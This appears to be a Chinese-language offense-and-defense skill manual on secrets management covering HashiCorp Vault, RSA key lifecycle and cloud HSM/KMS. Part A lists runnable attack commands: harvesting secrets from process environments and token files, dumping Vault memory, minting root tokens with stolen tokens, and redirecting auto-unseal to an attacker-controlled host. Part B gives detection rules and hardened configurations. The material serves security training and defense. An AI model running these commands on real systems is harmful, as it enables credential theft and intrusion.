---
name: devsecops-secrets
description: >
  Complete manual for secrets management and cryptographic key operations. Covers HashiCorp Vault
  (KV v2, dynamic secrets for AWS/DB/PKI, transit encryption, auto-unseal), RSA key pair
  generation/rotation/lifecycle, HSM integration (AWS CloudHSM, Azure Key Vault, Google Cloud KMS),
  and enterprise secrets rotation patterns. Full attack simulation (secret extraction, Vault unseal
  key theft, HSM compromise) and defense (policies, audit logging, auto-rotation).
domain: cybersecurity
subdomain: devsecops
tags: [vault, secrets, hsm, rsa, key-management, cloudhsm, azure-key-vault, gcp-kms, pki, transit, dynamic-secrets]
version: 2.0.0
---

# 密钥与 Secrets 管理 — 完整攻防手册

## 适用场景

- 部署 HashiCorp Vault（KV v2 静态密钥、动态密钥、PKI 引擎、Transit 加密引擎、自动解封）
- 管理 RSA 密钥对生命周期（生成 / 分发 / 轮换 / 吊销）
- 集成 HSM 硬件安全模块（AWS CloudHSM / Azure Key Vault / Google Cloud KMS）
- 设计企业级密钥轮换策略和 Secrets 自动化流水线
- 红队模拟密钥泄露攻击和蓝队建设检测防御体系

**不适用场景**：TLS 证书管理（参见 `tls-hardening`）；OAuth/OIDC 令牌（参见 `auth-sec`）；Kubernetes Secrets（参见 `container-escape`）。

## 前置条件

- Linux 系统管理基础（systemd / journalctl）
- 网络协议基础（HTTPS / mTLS / TCP）
- 云平台基础操作（AWS / Azure / GCP）
- 加密基础概念（对称 / 非对称 / 哈希 / PKI）

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 Secrets 泄露扫描

```bash
# 1. Git 历史中的密钥泄露
trufflehog git file://./repo --only-verified
gitleaks detect --source ./repo --report-format json --report-path leaks.json

# 2. 实时扫描常见密钥模式
grep -rnE '(A3T[A-Z0-9]|AKIA[0-9A-Z]{16}|aws_secret_access_key|-----BEGIN RSA PRIVATE KEY-----|eyJ[A-Za-z0-9-_]+)' ./src/

# 3. Docker 镜像中的密钥
docker history --no-trunc target-image:latest 2>/dev/null | grep -iE '(password|secret|token|key)'
docker run --rm -it target-image:latest find / -name "*.env" -o -name "*.pem" -o -name "*.key" 2>/dev/null

# 4. 环境变量泄露
# 检测 /proc 下进程环境变量中的密钥（需要本地访问或容器逃逸）
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE '(password|secret|token|api_key)' && echo "[+] PID: $pid"
done
```

#### 1.2 Vault 端点探测

```bash
# 1. 发现 Vault 实例
nmap -p 8200,8201 -sV --script http-title target-range
curl -sk https://target:8200/v1/sys/health 2>/dev/null | jq .
curl -sk https://target:8200/v1/sys/seal-status 2>/dev/null | jq .

# 2. 枚举已启用的 Secrets 引擎
curl -sk -H "X-Vault-Token: $VAULT_TOKEN" \
  https://target:8200/v1/sys/mounts | jq 'to_entries[] | select(.value.type) | {path: .key, type: .value.type}'

# 3. 探测 Vault 配置（未授权访问 /debug/pprof）
curl -sk https://target:8200/debug/pprof/ 2>/dev/null
curl -sk https://target:8200/v1/sys/internal/counters/activity 2>/dev/null
```

#### 1.3 HSM / Cloud KMS 端点探测

```bash
# AWS CloudHSM
aws cloudhsmv2 describe-clusters --region us-east-1 2>/dev/null
aws kms list-keys --region us-east-1 --output json 2>/dev/null

# Azure Key Vault
az keyvault list --output table 2>/dev/null
az keyvault secret list --vault-name target-vault --output table 2>/dev/null

# Google Cloud KMS
gcloud kms keyrings list --location global --project target-project 2>/dev/null
gcloud kms keys list --keyring target-ring --location global --project target-project 2>/dev/null
```

### 2. 利用与攻击

#### 2.1 Vault Token 窃取与滥用

```bash
# 1. 从文件系统获取 Vault Token
find / -name ".vault-token" -o -name "vault-token" 2>/dev/null
cat /home/*/.vault-token 2>/dev/null
cat /root/.vault-token 2>/dev/null
cat /etc/vault-token 2>/dev/null

# 2. 从进程环境变量获取
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep VAULT_TOKEN && echo "[+] PID: $pid"
done

# 3. 使用窃取的 Token 枚举权限
export VAULT_TOKEN="s.stolentoken12345"
vault token lookup
vault policy read $(vault token lookup -format=json | jq -r '.data.policies[]' | head -1)

# 4. 读取所有可达密钥
vault kv list secret/ 2>/dev/null
vault kv get secret/data/app/db-credentials 2>/dev/null

# 5. 利用高权限 Token 生成新的 Root Token
vault token create -policy=root -ttl=72h 2>/dev/null

# 6. 窃取响应封装（Response Wrapping）密钥
vault unwrap -wrap-ttl=5m <wrapping-token> 2>/dev/null
```

#### 2.2 Unseal Key 提取

```bash
# 1. 从 Vault 存储后端提取（需要访问 Consul/存储）
# Consul 后端
curl -sk http://consul:8500/v1/kv/vault/core/master?raw 2>/dev/null | base64 -d

# 2. 从文件系统提取 init 输出（常见错误：保存了 unseal keys）
find / -name "vault-init*" -o -name "vault-keys*" -o -name "unseal*" 2>/dev/null
grep -rn "Unseal Key" /home/ /root/ /opt/ /var/log/ 2>/dev/null

# 3. 从内存提取（需要 root 访问）
# 使用 Volatility 或 gdb 附加到 Vault 进程
gdb -p $(pgrep vault) -batch -ex "dump memory /tmp/vault-mem.bin 0x7f0000000000 0x7fffffffffff"
strings /tmp/vault-mem.bin | grep -E '^s\.[a-zA-Z0-9]{24}$'

# 4. Shamir Secret Sharing 攻击（需获取部分 unseal keys）
# 如果获取了 3/5 个 unseal keys 可以直接解封
vault operator unseal <key1> && vault operator unseal <key2> && vault operator unseal <key3>
```

#### 2.3 动态密钥滥用

```bash
# 1. 滥用 AWS Secret Engine 生成临时凭证
vault read aws/creds/admin-role 2>/dev/null
# 导出并使用
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
aws s3 ls  # 使用生成的凭证访问资源

# 2. 滥用 Database Secret Engine 获取数据库凭证
vault read database/creds/admin-role 2>/dev/null
# 使用获取的凭证直接连接数据库
mysql -h db-host -u 'v-token-xxxx' -p'generated-password'

# 3. PKI 引擎滥用：签发恶意证书
vault write pki/issue/internal \
  common_name=" legitimate-service.internal" \
  ttl=8760h 2>/dev/null
```

#### 2.4 RSA 密钥恢复攻击

```bash
# 1. 从 PEM 文件中提取公钥参数（分析密钥强度）
openssl rsa -pubin -in public.pem -text -noout 2>/dev/null
# 检查密钥长度（<2048 为弱密钥）

# 2. 弱 RSA 密钥因子分解（针对 <1024 位密钥）
# 使用 CADO-NFS 或 msieve
# 512-bit example (feasible):
python3 -c "
from Crypto.PublicKey import RSA
from factordb import factordb
key = RSA.import_key(open('weak_512.pem').read())
print(f'n = {key.n}')
print(f'e = {key.e}')
# 提交到 factordb.com 进行分解
"

# 3. RSA 低指数攻击（e=3, small message）
# 当 e 很小且消息未充分填充时，可计算立方根恢复明文
python3 -c "
import gmpy2
c = 0x...  # 密文
m = gmpy2.iroot(c, 3)[0]
print(bytes.fromhex(hex(int(m))[2:]))
"

# 4. 从 p12/pfx 文件提取密钥（弱密码）
openssl pkcs12 -in cert.p12 -nocerts -out key.pem -passout pass:tmp 2>/dev/null
# 暴力破解密码
john --wordlist=/usr/share/wordlists/rockyou.txt p12_hash.txt
```

#### 2.5 HSM 攻击向量

```bash
# 1. PKCS#11 会话劫持
pkcs11-tool --module /usr/lib/libCloudHsmPkcs11.so -O 2>/dev/null
pkcs11-tool --module /usr/lib/libCloudHsmPkcs11.so --login --pin <stolen-pin> -k 2>/dev/null

# 2. AWS CloudHSM CU 用户密码提取
# 通过 Keyshot 或内部威胁获取 CU 凭证
cloudhsm_mgmt_util getPubKey internal.log 2>/dev/null

# 3. Azure Key Vault 防火墙配置错误利用
# 检查网络规则
az keyvault network-rule list --name target-vault 2>/dev/null
# 如果允许所有网络访问
az keyvault secret show --vault-name target-vault --name connection-string 2>/dev/null

# 4. GCP KMS 密钥版本滥用
# 利用过度宽松的 IAM 策略
gcloud kms keys get-iam-policy target-key --keyring=target-ring --location=global 2>/dev/null
# 检查是否有 roles/cloudkms.cryptoKeyEncrypterDecrypter 被过度授予
```

#### 2.6 Secrets Sprawl 利用

```bash
# 1. CI/CD 管道中的密钥泄露
# GitHub Actions 日志中的密钥
gh api repos/{owner}/{repo}/actions/runs --jq '.workflow_runs[].id' | while read run_id; do
  gh api repos/{owner}/{repo}/actions/runs/$run_id/jobs --jq '.jobs[].id' | while read job_id; do
    gh api repos/{owner}/{repo}/actions/jobs/$job_id/logs 2>/dev/null | grep -iE '(password|secret|token|api_key)'
  done
done

# 2. Terraform State 中的明文密钥
# 检查远程 state 文件
curl -sk https://backend.example.com/terraform.tfstate 2>/dev/null | jq '.. | objects | select(has("password")) | .password'

# 3. Kubernetes ConfigMaps/Secrets（base64 解码即明文）
kubectl get secrets --all-namespaces -o json | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace, data: .data}' 2>/dev/null
```

### 3. 工具使用

#### 3.1 Vault CLI 攻击操作速查

```bash
# 认证
vault login <token>
vault login -method=userpass username=admin password=pwd
vault login -method=ldap username=user

# 密钥读取
vault kv list secret/data/
vault kv get -format=json secret/data/app/config
vault kv get -field=password secret/data/app/db

# 动态凭证生成
vault read aws/creds/developer
vault read database/creds/readonly
vault read pki/issue/internal common_name=app.internal

# 权限枚举
vault policy list
vault policy read admin-policy
vault token lookup -format=json | jq '.data.policies'
vault token capabilities secret/data/app/config
```

#### 3.2 云 KMS CLI 操作

```bash
# AWS KMS
aws kms encrypt --key-id alias/app-key --plaintext "secret" --output text --query CiphertextBlob
aws kms decrypt --ciphertext-blob fileb://encrypted.bin --output text --query Plaintext | base64 -d
aws kms generate-data-key --key-id alias/app-key --key-spec AES_256

# Azure Key Vault
az keyvault secret set --vault-name myvault --name db-password --value "s3cret!"
az keyvault secret show --vault-name myvault --name db-password --query value -o tsv
az keyvault key create --vault-name myvault --name rsa-key --kty RSA --size 4096
az keyvault backup secret --vault-name myvault --name db-password --file backup.dat

# Google Cloud KMS
echo -n "secret" | gcloud kms encrypt --key app-key --keyring prod-ring --location global --plaintext-file - --ciphertext-file encrypted.bin
gcloud kms decrypt --key app-key --keyring prod-ring --location global --ciphertext-file encrypted.bin --plaintext-file -
gcloud kms keys create app-key --keyring prod-ring --location global --purpose encryption --rotation-period 90d
```

#### 3.3 OpenSSL RSA 操作

```bash
# 生成 RSA 密钥对（推荐 4096 位）
openssl genrsa -out private.pem 4096
openssl rsa -in private.pem -pubout -out public.pem

# 密钥检查与验证
openssl rsa -in private.pem -check -noout
openssl rsa -in private.pem -text -noout | head -5

# PKCS#8 格式转换
openssl pkcs8 -topk8 -inform PEM -outform PEM -in private.pem -out private-pkcs8.pem -nocrypt

# 证书签名请求
openssl req -new -key private.pem -out csr.pem -subj "/CN=app-service/O=Company/C=US"

# 密钥强度测试
openssl rsa -in private.pem -text -noout 2>&1 | grep "Private-Key:" # 确认位长
ssh-keygen -l -f public.pem  # 检查指纹和位长
```

### 4. 绕过技术

#### 4.1 Vault Policy 绕过

```bash
# 1. 利用路径通配符配置错误
# 如果策略定义: path "secret/data/*" { capabilities = ["read"] }
# 但有: path "secret/metadata/*" { capabilities = ["deny"] }
vault kv get secret/data/app/../../../admin/config 2>/dev/null

# 2. 利用列表操作绕过拒绝策略
vault kv list secret/data/ 2>/dev/null  # 某些版本 list 不受 deny 约束

# 3. 利用 Version 参数读取已删除版本
vault kv get -version=1 secret/data/app/rotated-secret 2>/dev/null
vault kv metadata get secret/data/app/rotated-secret 2>/dev/null

# 4. Response Wrapping 攻击
# 拦截并重放 wrapping token
VAULT_TOKEN=<wrapping-token> vault unwrap
```

#### 4.2 Seal/Unseal 操纵

```bash
# 1. 自动解封配置篡改（如果有 transit auto-unseal）
# 修改 Vault 配置文件，指向攻击者控制的解封 Vault
# seal "transit" {
#   address = "https://attacker-vault:8200"  # 篡改目标
#   token = "s.stolen-token"
#   unwrap_token = false
# }

# 2. 利用 Shamir 门限不足（例如 1-of-5）
# 只需一个 unseal key 即可解封，降低攻击门槛
vault operator init -key-shares=1 -key-threshold=1  # 极不安全配置

# 3. 存储后端直接操作
# 直接访问 Consul/Raft 存储，绕过 Vault 封封
curl http://consul:8500/v1/kv/?recurse&keys 2>/dev/null | jq '.[].Key' | grep vault
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 Vault 审计日志分析

```hcl
# Vault 审计日志启用（文件 + Syslog 双写）
vault audit enable file file_path=/var/log/vault/audit.log
vault audit enable syslog facility="LOCAL0" tag="vault"
```

```bash
# 检测高危险操作
# 1. Root Token 生成
grep '"type":"request"' /var/log/vault/audit.log | \
  jq 'select(.request.path == "auth/token/create" and .request.data.policies == ["root"])'

# 2. 批量密钥读取（数据窃取指标）
grep '"type":"request"' /var/log/vault/audit.log | \
  jq -r 'select(.request.path | test("secret/data/")) | "\(.time) \(.auth.accessor) \(.request.path)"' | \
  awk '{count[$2]++} END {for(k in count) if(count[k]>50) print "[ALERT] accessor:",k,"reads:",count[k]}'

# 3. 异常认证尝试
grep '"type":"request"' /var/log/vault/audit.log | \
  jq 'select(.request.path == "auth/userpass/login" and .response.data.auth.lease_duration != null) | "\(.time) user=\(.request.data.username)"'

# 4. 策略修改
grep '"type":"request"' /var/log/vault/audit.log | \
  jq 'select(.request.path | test("sys/policies/acl/")) | "\(.time) \(.request.path) \(.request.operation)"'
```

#### 5.2 HSM 访问监控

```bash
# AWS CloudHSM 审计日志
aws cloudhsmv2 describe-clusters --filters clusterIds=cluster-xxx --region us-east-1
# CloudTrail 监控 KMS 操作
aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceType,AttributeValue="AWS KMS Key" \
  --max-results 50 --query 'Events[?EventName==`Decrypt`].{time:EventTime,user:Username,key:ResourceName}'

# Azure Key Vault 诊断日志
az monitor diagnostic-settings create \
  --resource /subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.KeyVault/vaults/{vault} \
  --name audit-logs --logs '[{"category":"AuditEvent","enabled":true}]' \
  --workspace /subscriptions/{sub}/resourcegroups/{rg}/providers/microsoft.operationalinsights/workspaces/{ws}

# GCP KMS 审计日志（通过 Cloud Audit Logs）
gcloud logging read 'resource.type="cloudkms_cryptokey" AND protoPayload.methodName="Encrypt"' \
  --limit 50 --format json --project target-project
```

#### 5.3 密钥轮换失败检测

```bash
# 检测密钥超过轮换期限
# Vault 密钥版本检查
vault kv metadata get -format=json secret/data/app/db-password | \
  jq -r '.data.versions | to_entries[] | select(.value.deletion_time == "") | "\(.key): created=\(.value.created_time)"'

# AWS KMS 密钥轮换状态
aws kms list-keys --query 'Keys[].KeyId' --output text | tr '\t' '\n' | while read key_id; do
  rotation=$(aws kms get-key-rotation-status --key-id $key_id --query 'KeyRotationEnabled' --output text 2>/dev/null)
  echo "[${rotation:-N/A}] Key: $key_id"
done

# 检测弱 RSA 密钥（<2048 位）
find /etc/ssl /opt/certs -name "*.pem" -exec sh -c '
  bits=$(openssl rsa -in "$1" -text -noout 2>/dev/null | grep "Private-Key:" | grep -oE "[0-9]+ bit")
  if [ -n "$bits" ] && [ "${bits%% *}" -lt 2048 ]; then
    echo "[WEAK] $1: $bits"
  fi
' _ {} \;
```

### 6. 修复方案

#### 6.1 Vault HA 集群部署（Raft 存储）

```hcl
# vault-config.hcl — 节点 1（leader）
cluster_name = "prod-vault"
api_addr     = "https://vault-1.example.com:8200"
cluster_addr = "https://vault-1.example.com:8201"
ui           = true
disable_mlock = false

storage "raft" {
  path    = "/opt/vault/data"
  node_id = "vault-1"
  retry_join {
    leader_api_addr = "https://vault-1.example.com:8200"
  }
  retry_join {
    leader_api_addr = "https://vault-2.example.com:8200"
  }
  retry_join {
    leader_api_addr = "https://vault-3.example.com:8200"
  }
}

listener "tcp" {
  address       = "0.0.0.0:8200"
  cluster_address = "0.0.0.0:8201"
  tls_cert_file = "/opt/vault/tls/vault.crt"
  tls_key_file  = "/opt/vault/tls/vault.key"
  tls_client_ca_file = "/opt/vault/tls/ca.crt"
}

# 自动解封（使用 AWS KMS）
seal "awskms" {
  region     = "us-east-1"
  access_key = ""  # 推荐 IAM Role
  secret_key = ""
  kms_key_id = "arn:aws:kms:us-east-1:123456789012:key/xxx"
}

# 审计日志
telemetry {
  prometheus_retention_time = "24h"
  disable_hostname          = true
}
```

```bash
# 初始化 Vault（生产环境：5 个 unseal keys，需要 3 个解封）
vault operator init -key-shares=5 -key-threshold=3 -recovery-shares=5 -recovery-threshold=3 > /tmp/vault-init.txt

# 解封
vault operator unseal <key1>
vault operator unseal <key2>
vault operator unseal <key3>

# 将 unseal keys 安全分发（PGP 加密）
vault operator init -key-shares=5 -key-threshold=3 \
  -pgp-keys="key1.asc,key2.asc,key3.asc,key4.asc,key5.asc" \
  -recovery-pgp-keys="key1.asc,key2.asc,key3.asc,key4.asc,key5.asc"
```

#### 6.2 Vault 最小权限策略

```hcl
# 应用只读策略 — apps-can-read
path "secret/data/app/{{identity.entity.aliases.auth_kubernetes_123456.metadata.service_account_name}}/*" {
  capabilities = ["read"]
}

path "secret/metadata/app/{{identity.entity.aliases.auth_kubernetes_123456.metadata.service_account_name}}/*" {
  capabilities = ["list", "read"]
}

# 数据库只读动态凭证策略 — db-readonly
path "database/creds/readonly" {
  capabilities = ["read"]
}

path "database/creds/readwrite" {
  capabilities = ["deny"]
}

# PKI 有限签发策略 — pki-issuer
path "pki/issue/internal" {
  capabilities = ["update"]
  allowed_parameters = {
    "common_name" = ["*.app.internal", "app.internal"]
    "ttl"         = ["24h", "48h", "720h"]
  }
}

# 管理员策略 — security-admin
path "secret/data/*" {
  capabilities = ["create", "read", "update", "delete", "list"]
}

path "sys/mounts/*" {
  capabilities = ["read", "list"]
}

path "sys/policies/acl/*" {
  capabilities = ["read", "list"]
}

path "auth/token/renew" {
  capabilities = ["update"]
}

path "auth/token/renew-self" {
  capabilities = ["update"]
}
```

```bash
# 应用策略
vault policy write apps-can-read - <<'EOF'
path "secret/data/app/{{identity.entity.name}}/*" {
  capabilities = ["read"]
}
EOF

# 启用 Kubernetes 认证
vault auth enable kubernetes
vault write auth/kubernetes/config \
  kubernetes_host="https://k8s-api:6443" \
  kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  token_reviewer_jwt=@/var/run/secrets/kubernetes.io/serviceaccount/token
```

#### 6.3 动态密钥配置（AWS / MySQL / PostgreSQL）

```bash
# ===== AWS Secret Engine =====
vault secrets enable aws
vault write aws/config/root \
  access_key=$AWS_ACCESS_KEY_ID \
  secret_key=$AWS_SECRET_ACCESS_KEY \
  region=us-east-1

# 创建角色：生成 1 小时有效的只读凭证
vault write aws/roles/readonly-role \
  credential_type=iam_user \
  policy_arns="arn:aws:iam::aws:policy/ReadOnlyAccess" \
  ttl=1h max_ttl=4h

# 创建角色：STS AssumeRole 方式（更安全）
vault write aws/roles/sts-admin-role \
  credential_type=assumed_role \
  role_arns="arn:aws:iam::123456789012:role/VaultAdmin" \
  ttl=1h max_ttl=4h

# ===== MySQL Secret Engine =====
vault secrets enable database
vault write database/config/mysql-prod \
  plugin_name=mysql-database-plugin \
  connection_url="{{username}}:{{password}}@tcp(mysql-prod:3306)/" \
  allowed_roles="readonly,readwrite" \
  username="vault-admin" \
  password="$VAULT_DB_ADMIN_PASSWORD"

# 轮换 vault-admin 密码（首次配置后立即轮换）
vault write -force database/rotate-root/mysql-prod

# 创建只读角色
vault write database/roles/readonly \
  db_name=mysql-prod \
  creation_statements="CREATE USER '{{name}}'@'%' IDENTIFIED BY '{{password}}'; GRANT SELECT ON *.* TO '{{name}}'@'%';" \
  default_ttl=1h max_ttl=24h

# ===== PostgreSQL Secret Engine =====
vault write database/config/postgres-prod \
  plugin_name=postgresql-database-plugin \
  allowed_roles="readonly,readwrite,admin" \
  connection_url="postgresql://{{username}}:{{password}}@postgres-prod:5432/postgres?sslmode=require" \
  username="vault-admin" \
  password="$VAULT_PG_ADMIN_PASSWORD"

vault write database/roles/readonly \
  db_name=postgres-prod \
  creation_statements="CREATE ROLE \"{{name}}\" WITH LOGIN PASSWORD '{{password}}' VALID UNTIL '{{expiration}}'; GRANT SELECT ON ALL TABLES IN SCHEMA public TO \"{{name}}\";" \
  revocation_statements="DROP ROLE IF EXISTS \"{{name}}\";" \
  default_ttl=1h max_ttl=24h
```

#### 6.4 PKI 引擎配置

```bash
# ===== Root CA =====
vault secrets enable pki
vault tune -max-lease-ttl=87600h pki

vault write pki/root/generate/internal \
  common_name="My Organization Root CA" \
  ttl=87600h \
  key_type=rsa \
  key_bits=4096 \
  exclude_cn_from_sans=true

# 发布 CRL 和 AIA
vault write pki/config/urls \
  issuing_certificates="https://vault.example.com:8200/v1/pki/ca" \
  crl_distribution_points="https://vault.example.com:8200/v1/pki/crl"

# ===== Intermediate CA =====
vault secrets enable -path=pki-int pki
vault tune -max-lease-ttl=43800h pki-int

# 生成交互式 CA CSR
vault write -format=json pki-int/intermediate/generate/internal \
  common_name="My Organization Intermediate CA" \
  ttl=43800h key_type=rsa key_bits=4096 | \
  jq -r '.data.csr' > intermediate.csr

# Root CA 签发 Intermediate 证书
vault write -format=json pki/root/sign-intermediate \
  csr=@intermediate.csr \
  format=pem_bundle ttl=43800h | \
  jq -r '.data.certificate' > intermediate.crt

# 设置已签发的 Intermediate 证书
vault write pki-int/intermediate/set-signed certificate=@intermediate.crt

# 创建角色用于签发终端证书
vault write pki-int/roles/internal \
  allowed_domains=["app.internal","svc.internal"] \
  allow_subdomains=true \
  allow_bare_domains=false \
  max_ttl=720h \
  key_type=rsa \
  key_bits=2048 \
  server_flag=true \
  client_flag=true

# 签发证书
vault write pki-int/issue/internal \
  common_name="api.app.internal" \
  ttl=720h
```

#### 6.5 Transit 加密引擎（Encryption-as-a-Service）

```bash
# 启用 Transit 引擎
vault secrets enable transit

# 创建 AES-256-GCM 加密密钥
vault write -f transit/keys/app-data-key type=aes256-gcm96

# 创建带自动轮换的密钥（90 天）
vault write -f transit/keys/rotating-key type=aes256-gcm96
vault write transit/keys/rotating-key/config auto_rotate_period=2160h  # 90 天

# 加密
vault write transit/encrypt/app-data-key plaintext=$(echo -n "sensitive data" | base64)
# → ciphertext: "vault:v1:xxxx"

# 解密
vault write transit/decrypt/app-data-key ciphertext="vault:v1:xxxx"

# 批量加密
vault write transit/encrypt/app-data-key batch_input='[{"plaintext":"c2Vucw=="},{"plaintext":"aXRpdmU="}]'

# 密钥轮换（手动）
vault write -f transit/keys/app-data-key/rotate

# 收敛加密（确定性加密，适合索引字段）
vault write -f transit/keys/pii-key type=aes256-gcm96 converged=true
vault write transit/encrypt/pii-key plaintext=$(echo -n "SSN-123-45-6789" | base64) \
  context=$(echo -n "user-123" | base64)
```

#### 6.6 RSA 密钥生命周期管理脚本

```bash
#!/bin/bash
# rsa-lifecycle.sh — RSA 密钥生命周期管理
set -euo pipefail

KEY_DIR="/opt/keys/rsa"
VAULT_ADDR="https://vault:8200"
VAULT_TOKEN="${VAULT_TOKEN:?VAULT_TOKEN not set}"
KEY_SIZE=4096
ROTATION_DAYS=365

# 生成新密钥对
generate_key() {
  local name=$1
  local ts=$(date +%Y%m%d%H%M%S)
  mkdir -p "$KEY_DIR/$name"

  openssl genrsa -out "$KEY_DIR/$name/private-$ts.pem" $KEY_SIZE
  openssl rsa -in "$KEY_DIR/$name/private-$ts.pem" -pubout -out "$KEY_DIR/$name/public-$ts.pem"

  # 存入 Vault
  vault kv put secret/data/rsa-keys/$name \
    private_key=@"$KEY_DIR/$name/private-$ts.pem" \
    public_key=@"$KEY_DIR/$name/public-$ts.pem" \
    generated_at="$(date -Iseconds)" \
    key_size=$KEY_SIZE

  echo "[+] Generated $KEY_SIZE-bit RSA key pair: $name/$ts"
}

# 轮换密钥
rotate_key() {
  local name=$1

  # 保留旧公钥用于验证
  local old_pub=$(vault kv get -field=public_key secret/data/rsa-keys/$name)
  echo "$old_pub" > "$KEY_DIR/$name/old-public.pem"

  # 生成新密钥
  generate_key "$name"

  # 标记旧密钥版本
  local current_ver=$(vault kv metadata get -format=json secret/data/rsa-keys/$name | jq -r '.data.current_version')
  vault kv put secret/data/rsa-keys/$name/archive/v$((current_ver-1)) \
    note="Archived during rotation" \
    archived_at="$(date -Iseconds)"

  echo "[+] Rotated key: $name (old version: $((current_ver-1)))"
}

# 验证密钥强度
validate_key() {
  local key_file=$1
  local bits=$(openssl rsa -in "$key_file" -text -noout 2>&1 | grep -oE '[0-9]+ bit' | grep -oE '[0-9]+')
  if [ "${bits:-0}" -lt 2048 ]; then
    echo "[CRITICAL] Weak RSA key: $bits bits in $key_file"
    return 1
  fi
  echo "[OK] Key strength: $bits bits"
}

# 检查轮换到期
check_rotation() {
  local name=$1
  local gen_time=$(vault kv get -field=generated_at secret/data/rsa-keys/$name)
  local gen_epoch=$(date -j -f "%Y-%m-%dT%H:%M:%S%z" "$gen_time" "+%s" 2>/dev/null || echo 0)
  local now_epoch=$(date "+%s")
  local age_days=$(( (now_epoch - gen_epoch) / 86400 ))

  if [ "$age_days" -gt "$ROTATION_DAYS" ]; then
    echo "[WARN] Key '$name' is $age_days days old (rotation threshold: $ROTATION_DAYS)"
    return 1
  fi
  echo "[OK] Key '$name' age: $age_days/$ROTATION_DAYS days"
}

# 主菜单
case "${1:-help}" in
  generate) generate_key "${2:?name required}" ;;
  rotate)   rotate_key "${2:?name required}" ;;
  validate) validate_key "${2:?key file required}" ;;
  check)    check_rotation "${2:?name required}" ;;
  *) echo "Usage: $0 {generate|rotate|validate|check} <name|file>" ;;
esac
```

#### 6.7 HSM 集成配置

```bash
# ===== AWS CloudHSM 集成 =====
# 1. 安装 CloudHSM 客户端
wget https://s3.amazonaws.com/cloudhsmv2-software/CloudHsmClient/EL7/cloudhsm-client-latest.el7.x86_64.rpm
sudo yum install -y ./cloudhsm-client-latest.el7.x86_64.rpm

# 2. 配置集群连接
sudo /opt/cloudhsm/bin/configure -a <cluster-ip>

# 3. 创建 CU（Crypto User）用于 Vault
/opt/cloudhsm/bin/cloudhsm_mgmt_util /opt/cloudhsm/etc/cloudhsm_mgmt_util.cfg
# > createUser CU vault-user <password>

# 4. Vault CloudHSM Seal 配置
# vault-config.hcl
# seal "pkcs11" {
#   lib            = "/opt/cloudhsm/lib/libcloudhsm_pkcs11.so"
#   slot           = "0"
#   pin            = "vault-user:password"
#   key_label      = "vault-unseal-key"
#   generate_key   = true
#   mechanism      = "0x1082"  # CKM_AES_CBC_PAD
# }

# ===== Azure Key Vault 集成 =====
# 1. 创建 Key Vault（启用清除保护）
az keyvault create \
  --name prod-vault-kv \
  --resource-group prod-rg \
  --location eastus \
  --enable-purge-protection true \
  --enable-soft-delete true \
  --default-action Deny \
  --network-acls-ips "10.0.0.0/24"

# 2. 创建 RSA 密钥（HSM 后端）
az keyvault key create \
  --vault-name prod-vault-kv \
  --name signing-key \
  --kty RSA-HSM \
  --size 4096 \
  --ops sign verify \
  --policy '{
    "lifetime_actions": [{
      "trigger": {"time_after_create": "P365D"},
      "action": {"type": "rotate"}}
    ]}'

# 3. Vault Azure Key Vault 自动解封
# seal "azurekeyvault" {
#   tenant_id      = "xxx"
#   client_id      = "xxx"
#   client_secret  = "xxx"
#   vault_name     = "prod-vault-kv"
#   key_name       = "vault-unseal-key"
# }

# ===== Google Cloud KMS 集成 =====
# 1. 创建密钥环和密钥
gcloud kms keyrings create prod-ring --location global --project my-project
gcloud kms keys create vault-unseal \
  --keyring prod-ring --location global --project my-project \
  --purpose encryption \
  --rotation-period 90d \
  --next-rotation-time=$(date -u -d '+90 days' +%Y-%m-%dT%H:%M:%SZ)

# 2. 授权 Vault Service Account
gcloud kms keys add-iam-policy-binding vault-unseal \
  --keyring prod-ring --location global \
  --member="serviceAccount:vault-sa@my-project.iam.gserviceaccount.com" \
  --role="roles/cloudkms.cryptoKeyEncrypterDecrypter"

# 3. Vault GCP KMS 自动解封
# seal "gcpckms" {
#   project  = "my-project"
#   region   = "global"
#   key_ring = "prod-ring"
#   crypto_key = "vault-unseal"
# }
```

#### 6.8 自动轮换策略

```bash
# Vault 密钥自动轮换配置
# MySQL 凭证自动轮换
vault write database/roles/app-user \
  db_name=mysql-prod \
  creation_statements="CREATE USER '{{name}}'@'%' IDENTIFIED BY '{{password}}'; GRANT SELECT, INSERT, UPDATE ON app_db.* TO '{{name}}'@'%';" \
  revocation_statements="DROP USER IF EXISTS '{{name}}'@'%';" \
  default_ttl=4h max_ttl=24h

# Vault 自身密钥轮换
vault write -f transit/keys/app-data-key/rotate
vault write transit/keys/app-data-key/config min_decryption_version=2 min_encryption_version=3

# 通过 Cron 自动化轮换检查
cat > /etc/cron.daily/vault-rotation-check << 'CRON'
#!/bin/bash
# 检查并报告超过 90 天未轮换的密钥
vault kv list -format=json secret/data/ | jq -r '.[]' | while read path; do
  meta=$(vault kv metadata get -format=json "secret/data/$path" 2>/dev/null)
  if [ -n "$meta" ]; then
    ver=$(echo "$meta" | jq -r '.data.current_version')
    created=$(echo "$meta" | jq -r ".data.versions[$ver].created_time")
    age=$(( ($(date +%s) - $(date -d "$created" +%s)) / 86400 ))
    [ "$age" -gt 90 ] && echo "[ROTATE] $path: version $ver is $age days old"
  fi
done
CRON
chmod +x /etc/cron.daily/vault-rotation-check
```

---

## 速查表

### Secrets 管理平台对比

| 特性 | HashiCorp Vault | AWS Secrets Manager | Azure Key Vault | GCP Secret Manager |
|------|----------------|-------------------|-----------------|-------------------|
| 静态密钥 | KV v2 | 原生支持 | Secret Store | Secret Manager |
| 动态密钥 | 20+ 引擎 | RDS 自动轮换 | 无（仅存储） | 无（仅存储） |
| 加密即服务 | Transit | KMS Encrypt | Key Vault Crypto | Cloud KMS |
| PKI/CA | 内置 PKI 引擎 | ACM | 无内置 CA | Certificate Authority |
| 自动轮换 | 动态密钥自动 | 数据库凭证 | 密钥策略触发 | 密钥轮换周期 |
